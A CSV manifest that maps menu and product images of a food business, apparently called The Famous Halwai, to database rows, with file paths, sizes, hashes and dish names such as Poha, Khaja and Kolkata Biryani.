319.jpg,notforgittrack/the-famous-halwai-images/images/319.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,319,Naivedyam,menu_small_img
32.jpg,notforgittrack/the-famous-halwai-images/images/32.jpg,170566,461dbac51b9fa2a336ce466768081610e2721af1519730cb004102f6fcbc0cd5,3f3f26f82000bc01a57edd3b1f794a43,DB Mapped (Verified),menu_item_tbl,32,Poha,menu_img
32.jpg,notforgittrack/the-famous-halwai-images/images/32.jpg,170566,461dbac51b9fa2a336ce466768081610e2721af1519730cb004102f6fcbc0cd5,3f3f26f82000bc01a57edd3b1f794a43,DB Mapped (Verified),product_item_tbl,32,Tomato Thokku,menu_img
320.jpeg,notforgittrack/the-famous-halwai-images/images/320.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,320,Chandrakala/ Pedakiya,menu_img
320.jpeg,notforgittrack/the-famous-halwai-images/images/320.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,320,Chandrakala/ Pedakiya,menu_small_img
321.jpg,notforgittrack/the-famous-halwai-images/images/321.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,321,Chana Ghugni,menu_img
321.jpg,notforgittrack/the-famous-halwai-images/images/321.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,321,Chana Ghugni,menu_small_img
322.jpg,notforgittrack/the-famous-halwai-images/images/322.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,322,Khaja,menu_img
322.jpg,notforgittrack/the-famous-halwai-images/images/322.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,322,Khaja,menu_small_img
323.jpg,notforgittrack/the-famous-halwai-images/images/323.jpg,12021,017e990b13fe9ba90afdfef5d437091415d4b450fea808599ecc7686de5f84a3,907652a67b926540b2fee5bd2c31e963,DB Mapped (Verified),menu_item_tbl,323,Mutton Kebabs and Reshmi Kebabs,menu_img
323.jpg,notforgittrack/the-famous-halwai-images/images/323.jpg,12021,017e990b13fe9ba90afdfef5d437091415d4b450fea808599ecc7686de5f84a3,907652a67b926540b2fee5bd2c31e963,DB Mapped (Verified),menu_item_tbl,323,Mutton Kebabs and Reshmi Kebabs,menu_small_img
324.webp,notforgittrack/the-famous-halwai-images/images/324.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,324,Kesar Peda,menu_img
324.webp,notforgittrack/the-famous-halwai-images/images/324.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,324,Kesar Peda,menu_small_img
325.jpg,notforgittrack/the-famous-halwai-images/images/325.jpg,6539,8b1d732ee69a61ff2f6547c0eb67eb2e44e6486a23aa68de3f8446c2f9ec8372,e908522597bb0b1e5d36f219ee16fd84,DB Mapped (Verified),menu_item_tbl,325,Laung-Latika,menu_img
325.jpg,notforgittrack/the-famous-halwai-images/images/325.jpg,6539,8b1d732ee69a61ff2f6547c0eb67eb2e44e6486a23aa68de3f8446c2f9ec8372,e908522597bb0b1e5d36f219ee16fd84,DB Mapped (Verified),menu_item_tbl,325,Laung-Latika,menu_small_img
326.jpeg,notforgittrack/the-famous-halwai-images/images/326.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,326,Dal Peetha,menu_img
326.jpeg,notforgittrack/the-famous-halwai-images/images/326.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,326,Dal Peetha,menu_small_img
327.jpg,notforgittrack/the-famous-halwai-images/images/327.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,327,Khajuria/Thekua,menu_img
327.jpg,notforgittrack/the-famous-halwai-images/images/327.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,327,Khajuria/Thekua,menu_small_img
328.jpg,notforgittrack/the-famous-halwai-images/images/328.jpg,140056,62cb3fb64d4cbc0bd07099e7445a3518d32e8c1ac03f70a5fef28e6e3d845508,831bc743b10a7f4f094ef51bdf1c680f,DB Mapped (Verified),menu_item_tbl,328,Malpuaa,menu_img
328.jpg,notforgittrack/the-famous-halwai-images/images/328.jpg,140056,62cb3fb64d4cbc0bd07099e7445a3518d32e8c1ac03f70a5fef28e6e3d845508,831bc743b10a7f4f094ef51bdf1c680f,DB Mapped (Verified),menu_item_tbl,328,Malpuaa,menu_small_img
329.webp,notforgittrack/the-famous-halwai-images/images/329.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,329,Rasia,menu_img
329.webp,notforgittrack/the-famous-halwai-images/images/329.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,329,Rasia,menu_small_img
33.jpeg,notforgittrack/the-famous-halwai-images/images/33.jpeg,69015,fcafea2e6c4d1affb18e6415fe028ce3f2197e28bebd12ff9bf101e61e347ca9,2d56091dee27659b955a13d7de372655,DB Mapped (Verified),menu_item_tbl,33,Sandwich,menu_img
330.jpg,notforgittrack/the-famous-halwai-images/images/330.jpg,10272,183cae79752f2cf8f56ffc5b1771cdeb604ff3e785c941499b552d3a02b98b7b,3dd56da922ad374b093ff8f8286cbb34,DB Mapped (Verified),menu_item_tbl,330,Pantua/Kala Jamun,menu_img
330.jpg,notforgittrack/the-famous-halwai-images/images/330.jpg,10272,183cae79752f2cf8f56ffc5b1771cdeb604ff3e785c941499b552d3a02b98b7b,3dd56da922ad374b093ff8f8286cbb34,DB Mapped (Verified),menu_item_tbl,330,Pantua/Kala Jamun,menu_small_img
331.jpeg,notforgittrack/the-famous-halwai-images/images/331.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,331,Khurma And Laktho,menu_img
331.jpeg,notforgittrack/the-famous-halwai-images/images/331.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,331,Khurma And Laktho,menu_small_img
332.jpeg,notforgittrack/the-famous-halwai-images/images/332.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,332,Balushahii,menu_img
332.jpeg,notforgittrack/the-famous-halwai-images/images/332.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,332,Balushahii,menu_small_img
333.jpeg,notforgittrack/the-famous-halwai-images/images/333.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,333,Parwal ki Mithai,menu_img
333.jpeg,notforgittrack/the-famous-halwai-images/images/333.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,333,Parwal ki Mithai,menu_small_img
334.jpeg,notforgittrack/the-famous-halwai-images/images/334.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,334,Gur Anarsa,menu_img
334.jpeg,notforgittrack/the-famous-halwai-images/images/334.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,334,Gur Anarsa,menu_small_img
335.jpeg,notforgittrack/the-famous-halwai-images/images/335.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,335,Laai,menu_img
335.jpeg,notforgittrack/the-famous-halwai-images/images/335.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,335,Laai,menu_small_img
336.jpeg,notforgittrack/the-famous-halwai-images/images/336.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,336,Tilkut,menu_img
336.jpeg,notforgittrack/the-famous-halwai-images/images/336.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,336,Tilkut,menu_small_img
337.webp,notforgittrack/the-famous-halwai-images/images/337.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,337,Puri Sabzi,menu_img
337.webp,notforgittrack/the-famous-halwai-images/images/337.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,337,Puri Sabzi,menu_small_img
338.jpg,notforgittrack/the-famous-halwai-images/images/338.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,338,Sattu Sharbat,menu_img
338.jpg,notforgittrack/the-famous-halwai-images/images/338.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,338,Sattu Sharbat,menu_small_img
339.jpg,notforgittrack/the-famous-halwai-images/images/339.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),menu_item_tbl,339,Besan Masala Rot,menu_img
34.jpg,notforgittrack/the-famous-halwai-images/images/34.jpg,150001,87246438223e89dd79dee6eee7fff35173bbee00c25019ecbddbf031bbe0760a,51484640590527d98c19be361e1c6b51,DB Mapped (Verified),menu_item_tbl,34,Sprouts,menu_img
34.jpg,notforgittrack/the-famous-halwai-images/images/34.jpg,150001,87246438223e89dd79dee6eee7fff35173bbee00c25019ecbddbf031bbe0760a,51484640590527d98c19be361e1c6b51,DB Mapped (Verified),product_item_tbl,34,Moringa Leaves Chutney,menu_img
340.jpeg,notforgittrack/the-famous-halwai-images/images/340.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,340,Desi Malpua,menu_img
340.jpeg,notforgittrack/the-famous-halwai-images/images/340.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,340,Desi Malpua,menu_small_img
341.jpg,notforgittrack/the-famous-halwai-images/images/341.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,341,Mithe Chawal,menu_img
341.jpg,notforgittrack/the-famous-halwai-images/images/341.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,341,Mithe Chawal,menu_small_img
342.jpg,notforgittrack/the-famous-halwai-images/images/342.jpg,40862,31fa2e605a8c91f8ba84ba4bc40c7de93f009e5f7228d005580c828316f0138b,68fa040f3aa3bd5e802c8b2e778db746,DB Mapped (Verified),menu_item_tbl,342,Bajara Khichri,menu_img
342.jpg,notforgittrack/the-famous-halwai-images/images/342.jpg,40862,31fa2e605a8c91f8ba84ba4bc40c7de93f009e5f7228d005580c828316f0138b,68fa040f3aa3bd5e802c8b2e778db746,DB Mapped (Verified),menu_item_tbl,342,Bajara Khichri,menu_small_img
343.jpg,notforgittrack/the-famous-halwai-images/images/343.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,343,Bhura Roti Ghee,menu_img
343.jpg,notforgittrack/the-famous-halwai-images/images/343.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,343,Bhura Roti Ghee,menu_small_img
344.jpg,notforgittrack/the-famous-halwai-images/images/344.jpg,330026,de5e29bc21dab8d6600ab4cb80991d56061b77161469c3a304869c6e09a1a2f8,6674f28a79b1f208332fcd35d7544878,DB Mapped (Verified),menu_item_tbl,344,Bathua Raita,menu_img
344.jpg,notforgittrack/the-famous-halwai-images/images/344.jpg,330026,de5e29bc21dab8d6600ab4cb80991d56061b77161469c3a304869c6e09a1a2f8,6674f28a79b1f208332fcd35d7544878,DB Mapped (Verified),menu_item_tbl,344,Bathua Raita,menu_small_img
345.jpg,notforgittrack/the-famous-halwai-images/images/345.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,345,Bajara Aloo Roti,menu_img
345.jpg,notforgittrack/the-famous-halwai-images/images/345.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,345,Bajara Aloo Roti,menu_small_img
346.jpeg,notforgittrack/the-famous-halwai-images/images/346.jpeg,12412,970cbbaaf4a9ce0ae5bf44fc49f8b7ed5ea89f5f7593b4138be36e5406e9d877,9a44fce152a4c98cf31c777ec4803c3d,DB Mapped (Verified),menu_item_tbl,346,Methi Gaajar,menu_img
346.jpeg,notforgittrack/the-famous-halwai-images/images/346.jpeg,12412,970cbbaaf4a9ce0ae5bf44fc49f8b7ed5ea89f5f7593b4138be36e5406e9d877,9a44fce152a4c98cf31c777ec4803c3d,DB Mapped (Verified),menu_item_tbl,346,Methi Gaajar,menu_small_img
347.webp,notforgittrack/the-famous-halwai-images/images/347.webp,48044,d9b7b2405ab798dd5967a56466192c2914d9cb1bb11234ca63c726b9f272bc42,0223b17c9173ad29d80b619bf5323eb8,DB Mapped (Verified),menu_item_tbl,347,Alsi ki Pinni,menu_img
347.webp,notforgittrack/the-famous-halwai-images/images/347.webp,48044,d9b7b2405ab798dd5967a56466192c2914d9cb1bb11234ca63c726b9f272bc42,0223b17c9173ad29d80b619bf5323eb8,DB Mapped (Verified),menu_item_tbl,347,Alsi ki Pinni,menu_small_img
348.jpg,notforgittrack/the-famous-halwai-images/images/348.jpg,14958,5688002db0335f5f90ce619fa523b830819aaa1cb4f22fbfab9e51c2ee386ad0,1f4d307887522282d549744c413798ec,DB Mapped (Verified),menu_item_tbl,348,Madra,menu_img
348.jpg,notforgittrack/the-famous-halwai-images/images/348.jpg,14958,5688002db0335f5f90ce619fa523b830819aaa1cb4f22fbfab9e51c2ee386ad0,1f4d307887522282d549744c413798ec,DB Mapped (Verified),menu_item_tbl,348,Madra,menu_small_img
349.jpg,notforgittrack/the-famous-halwai-images/images/349.jpg,25423,2e20ee8747c15346640fcaefe08e8c6cd696ace82ed55fff34bdf33426f6fa8c,48f915445189aba714171e80fd3c8bb3,DB Mapped (Verified),menu_item_tbl,349,Siddu,menu_img
349.jpg,notforgittrack/the-famous-halwai-images/images/349.jpg,25423,2e20ee8747c15346640fcaefe08e8c6cd696ace82ed55fff34bdf33426f6fa8c,48f915445189aba714171e80fd3c8bb3,DB Mapped (Verified),menu_item_tbl,349,Siddu,menu_small_img
35.jpg,notforgittrack/the-famous-halwai-images/images/35.jpg,383358,9bf58f561f1a7e687368050d082784bfe79a06fa0320b737f42e8b929eb9a0aa,50976e08814a560b503f1bcbe1f89dc7,DB Mapped (Verified),menu_item_tbl,35,Cheela,menu_img
35.jpg,notforgittrack/the-famous-halwai-images/images/35.jpg,383358,9bf58f561f1a7e687368050d082784bfe79a06fa0320b737f42e8b929eb9a0aa,50976e08814a560b503f1bcbe1f89dc7,DB Mapped (Verified),product_item_tbl,35,Green Tomato Chutney,menu_img
350.jpg,notforgittrack/the-famous-halwai-images/images/350.jpg,18976,5c68bb1f68e27a95f9f2085b295e9a01315cfa3db05bde0b1242c061c9b778a0,2f25b5cbc8f891ae135d14f4c98c0e98,DB Mapped (Verified),menu_item_tbl,350,Dham,menu_img
350.jpg,notforgittrack/the-famous-halwai-images/images/350.jpg,18976,5c68bb1f68e27a95f9f2085b295e9a01315cfa3db05bde0b1242c061c9b778a0,2f25b5cbc8f891ae135d14f4c98c0e98,DB Mapped (Verified),menu_item_tbl,350,Dham,menu_small_img
351.jpg,notforgittrack/the-famous-halwai-images/images/351.jpg,11850,4c4a6edc0cfc86f505e0e681a12e630ffca3093713f35a0ec1316450df31b208,bc4f23d1ec4c4bb2583ff82407da14ae,DB Mapped (Verified),menu_item_tbl,351,Mittha Bhath,menu_img
351.jpg,notforgittrack/the-famous-halwai-images/images/351.jpg,11850,4c4a6edc0cfc86f505e0e681a12e630ffca3093713f35a0ec1316450df31b208,bc4f23d1ec4c4bb2583ff82407da14ae,DB Mapped (Verified),menu_item_tbl,351,Mittha Bhath,menu_small_img
352.jpeg,notforgittrack/the-famous-halwai-images/images/352.jpeg,15273,4df591ec298b32abdf6ff6cc7c408396ecab3ff1f7c0358ac2dd4e8eef0cb611,3c126fae6b06732b80c4cb4a072988df,DB Mapped (Verified),menu_item_tbl,352,Kullu Trout Fish,menu_img
352.jpeg,notforgittrack/the-famous-halwai-images/images/352.jpeg,15273,4df591ec298b32abdf6ff6cc7c408396ecab3ff1f7c0358ac2dd4e8eef0cb611,3c126fae6b06732b80c4cb4a072988df,DB Mapped (Verified),menu_item_tbl,352,Kullu Trout Fish,menu_small_img
353.jpg,notforgittrack/the-famous-halwai-images/images/353.jpg,14034,e4dc628f451e41e08b240c5368892c4e3ce86f0b1f39ea1168c8617d13802c1b,2993f902f26b876bece4017df6aaf7e6,DB Mapped (Verified),menu_item_tbl,353,Tudkiya Bhath,menu_img
353.jpg,notforgittrack/the-famous-halwai-images/images/353.jpg,14034,e4dc628f451e41e08b240c5368892c4e3ce86f0b1f39ea1168c8617d13802c1b,2993f902f26b876bece4017df6aaf7e6,DB Mapped (Verified),menu_item_tbl,353,Tudkiya Bhath,menu_small_img
354.jpg,notforgittrack/the-famous-halwai-images/images/354.jpg,10307,54e77dec087c52a3e8aa260d6d49752da145f6c7ceec29bcb239d669add489d8,6d0ea37834497234a7e642bca73a09bd,DB Mapped (Verified),menu_item_tbl,354,Aktori,menu_img
354.jpg,notforgittrack/the-famous-halwai-images/images/354.jpg,10307,54e77dec087c52a3e8aa260d6d49752da145f6c7ceec29bcb239d669add489d8,6d0ea37834497234a7e642bca73a09bd,DB Mapped (Verified),menu_item_tbl,354,Aktori,menu_small_img
355.jpg,notforgittrack/the-famous-halwai-images/images/355.jpg,15558,da5ecc34a4408d9a83ec186792ce8ba141ff459bb75c872942ab4e2309c5f90c,3343308ad75f2f0388ff756c8fd39dd8,DB Mapped (Verified),menu_item_tbl,355,Patrode,menu_img
355.jpg,notforgittrack/the-famous-halwai-images/images/355.jpg,15558,da5ecc34a4408d9a83ec186792ce8ba141ff459bb75c872942ab4e2309c5f90c,3343308ad75f2f0388ff756c8fd39dd8,DB Mapped (Verified),menu_item_tbl,355,Patrode,menu_small_img
356.jpg,notforgittrack/the-famous-halwai-images/images/356.jpg,13422,8e97120a31da3f470919bad7c6ca2684daa5bf4973044fd568820993bd8b06ef,896672e17b29b4ab7c2fd621daa6cc23,DB Mapped (Verified),menu_item_tbl,356,Indore,menu_img
356.jpg,notforgittrack/the-famous-halwai-images/images/356.jpg,13422,8e97120a31da3f470919bad7c6ca2684daa5bf4973044fd568820993bd8b06ef,896672e17b29b4ab7c2fd621daa6cc23,DB Mapped (Verified),menu_item_tbl,356,Indore,menu_small_img
357.jpg,notforgittrack/the-famous-halwai-images/images/357.jpg,16133,bdde28b08477f0c0d304f38f156bbd1e9272951046008febab70c78f9e276ebe,d9be7a4df81050f024d154ba6b872da8,DB Mapped (Verified),menu_item_tbl,357,Mahni,menu_img
357.jpg,notforgittrack/the-famous-halwai-images/images/357.jpg,16133,bdde28b08477f0c0d304f38f156bbd1e9272951046008febab70c78f9e276ebe,d9be7a4df81050f024d154ba6b872da8,DB Mapped (Verified),menu_item_tbl,357,Mahni,menu_small_img
358.jpg,notforgittrack/the-famous-halwai-images/images/358.jpg,17854,f6ee02cd961e1532967edb9c8a3d4629419b19100c630b2bf35fcbee6e06590d,a6885843c0a545b8af9444c30e37f782,DB Mapped (Verified),menu_item_tbl,358,Chha Gosht,menu_img
358.jpg,notforgittrack/the-famous-halwai-images/images/358.jpg,17854,f6ee02cd961e1532967edb9c8a3d4629419b19100c630b2bf35fcbee6e06590d,a6885843c0a545b8af9444c30e37f782,DB Mapped (Verified),menu_item_tbl,358,Chha Gosht,menu_small_img
359.jpg,notforgittrack/the-famous-halwai-images/images/359.jpg,10966,837e561e4f130f7cd8f521593e9a5ce08cdc0d0391918eb55a1dacc102acb5e4,c64edd0270fad27c3e958d173b98a876,DB Mapped (Verified),menu_item_tbl,359,Bhey,menu_img
359.jpg,notforgittrack/the-famous-halwai-images/images/359.jpg,10966,837e561e4f130f7cd8f521593e9a5ce08cdc0d0391918eb55a1dacc102acb5e4,c64edd0270fad27c3e958d173b98a876,DB Mapped (Verified),menu_item_tbl,359,Bhey,menu_small_img
36.jpeg,notforgittrack/the-famous-halwai-images/images/36.jpeg,12904,a8f7dc039708813bd05a044d8cfd8287a90266143e42ad25a7528e67ae327a9d,8e241cabe8e54976cfab819fe0983424,DB Mapped (Verified),menu_item_tbl,36,Maggi,menu_img
360.jpg,notforgittrack/the-famous-halwai-images/images/360.jpg,95675,ae47dc8f0a7faaf77e18b5c4a3c4ba0d35ed0ad66a433e1944f3b712db54c1f1,c813032cac1bb7244fab40141e1dc647,DB Mapped (Verified),menu_item_tbl,360,Babru,menu_img
360.jpg,notforgittrack/the-famous-halwai-images/images/360.jpg,95675,ae47dc8f0a7faaf77e18b5c4a3c4ba0d35ed0ad66a433e1944f3b712db54c1f1,c813032cac1bb7244fab40141e1dc647,DB Mapped (Verified),menu_item_tbl,360,Babru,menu_small_img
361.jpg,notforgittrack/the-famous-halwai-images/images/361.jpg,20022,46a4a2fff76106bcaeb979e39de97b12df0a6e5b868403dd546175a717b99b03,4298bac3583385c8a8961339914c6030,DB Mapped (Verified),menu_item_tbl,361,Pakain,menu_img
361.jpg,notforgittrack/the-famous-halwai-images/images/361.jpg,20022,46a4a2fff76106bcaeb979e39de97b12df0a6e5b868403dd546175a717b99b03,4298bac3583385c8a8961339914c6030,DB Mapped (Verified),menu_item_tbl,361,Pakain,menu_small_img
362.jpeg,notforgittrack/the-famous-halwai-images/images/362.jpeg,10775,ec39381c1c6b1ba96c6f8388fdfee75ace72dd0de30692a2cce52c28c7dc76b3,a0c2be896f5293a301a407d35be46da6,DB Mapped (Verified),menu_item_tbl,362,Auriya Kadd,menu_img
362.jpeg,notforgittrack/the-famous-halwai-images/images/362.jpeg,10775,ec39381c1c6b1ba96c6f8388fdfee75ace72dd0de30692a2cce52c28c7dc76b3,a0c2be896f5293a301a407d35be46da6,DB Mapped (Verified),menu_item_tbl,362,Auriya Kadd,menu_small_img
363.jpg,notforgittrack/the-famous-halwai-images/images/363.jpg,11981,d7eeb5e3c7068b56e8e77a6201156f5b63697d97b4e2a29410288a9952f681b4,f02c05c098772c292760e18cb1892603,DB Mapped (Verified),menu_item_tbl,363,Macher Jhol,menu_img
363.jpg,notforgittrack/the-famous-halwai-images/images/363.jpg,11981,d7eeb5e3c7068b56e8e77a6201156f5b63697d97b4e2a29410288a9952f681b4,f02c05c098772c292760e18cb1892603,DB Mapped (Verified),menu_item_tbl,363,Macher Jhol,menu_small_img
364.jpg,notforgittrack/the-famous-halwai-images/images/364.jpg,17724,34d3db9bd234ae906ab30e0d27be845cf5fd49c8c933d2d1a3db971feb46615b,a3c221803b5b68b44f9b1b231f08bcc7,DB Mapped (Verified),menu_item_tbl,364,Kolkata Biryani,menu_img
364.jpg,notforgittrack/the-famous-halwai-images/images/364.jpg,17724,34d3db9bd234ae906ab30e0d27be845cf5fd49c8c933d2d1a3db971feb46615b,a3c221803b5b68b44f9b1b231f08bcc7,DB Mapped (Verified),menu_item_tbl,364,Kolkata Biryani,menu_small_img
365.jpeg,notforgittrack/the-famous-halwai-images/images/365.jpeg,11206,4de3fca22ccb53ed1dd0c1ece7562ca0140bd0f08d00c66916a4e8a96caf9bb2,292523d7294a533c6bb7014ddcd930f8,DB Mapped (Verified),menu_item_tbl,365,Kosha Mangsho,menu_img
365.jpeg,notforgittrack/the-famous-halwai-images/images/365.jpeg,11206,4de3fca22ccb53ed1dd0c1ece7562ca0140bd0f08d00c66916a4e8a96caf9bb2,292523d7294a533c6bb7014ddcd930f8,DB Mapped (Verified),menu_item_tbl,365,Kosha Mangsho,menu_small_img
366.jpg,notforgittrack/the-famous-halwai-images/images/366.jpg,11054,7fe7511b55f8a9467508bf1343a85197916ab726312409f65238c6a3bb2e98d5,2d1b170e5304bb4490b4205d85a9a007,DB Mapped (Verified),menu_item_tbl,366,Alur Torkari With Luchi,menu_img
366.jpg,notforgittrack/the-famous-halwai-images/images/366.jpg,11054,7fe7511b55f8a9467508bf1343a85197916ab726312409f65238c6a3bb2e98d5,2d1b170e5304bb4490b4205d85a9a007,DB Mapped (Verified),menu_item_tbl,366,Alur Torkari With Luchi,menu_small_img
367.jpg,notforgittrack/the-famous-halwai-images/images/367.jpg,15985,a93460028740e85a6608d859119fcd958476924d8be489100571f11908fe5645,b8df54c6b09d6ab5184021eef2a87ed3,DB Mapped (Verified),menu_item_tbl,367,Shukto â€“ Bowl Of Veggies,menu_img
367.jpg,notforgittrack/the-famous-halwai-images/images/367.jpg,15985,a93460028740e85a6608d859119fcd958476924d8be489100571f11908fe5645,b8df54c6b09d6ab5184021eef2a87ed3,DB Mapped (Verified),menu_item_tbl,367,Shukto â€“ Bowl Of Veggies,menu_small_img
368.jpeg,notforgittrack/the-famous-halwai-images/images/368.jpeg,160577,39cc375ccf51de32a0c03550b9810d7ff66f5e1ea9947cae51bf4474c9fe6025,ea9f7d20a38e5192a016a0ae00812571,DB Mapped (Verified),menu_item_tbl,368,Chelo Kebab,menu_img
368.jpeg,notforgittrack/the-famous-halwai-images/images/368.jpeg,160577,39cc375ccf51de32a0c03550b9810d7ff66f5e1ea9947cae51bf4474c9fe6025,ea9f7d20a38e5192a016a0ae00812571,DB Mapped (Verified),menu_item_tbl,368,Chelo Kebab,menu_small_img
369.jpeg,notforgittrack/the-famous-halwai-images/images/369.jpeg,15349,20db69b04b07feb695660edfacbd2ed476de5b14b6964c6d9db7aa2d0352b0d4,4330892846cfce994c712f2bf04aa8f0,DB Mapped (Verified),menu_item_tbl,369,Mochar Ghonto,menu_img
369.jpeg,notforgittrack/the-famous-halwai-images/images/369.jpeg,15349,20db69b04b07feb695660edfacbd2ed476de5b14b6964c6d9db7aa2d0352b0d4,4330892846cfce994c712f2bf04aa8f0,DB Mapped (Verified),menu_item_tbl,369,Mochar Ghonto,menu_small_img
37.jpg,notforgittrack/the-famous-halwai-images/images/37.jpg,77731,f9fbfb31c49091c6c70fa99b1e125f019c03179de5af2fcd7cca98fd83c337f4,a4087dc270dc6b60c644cad1786d3bf7,DB Mapped (Verified),menu_item_tbl,37,Corn Soup,menu_img
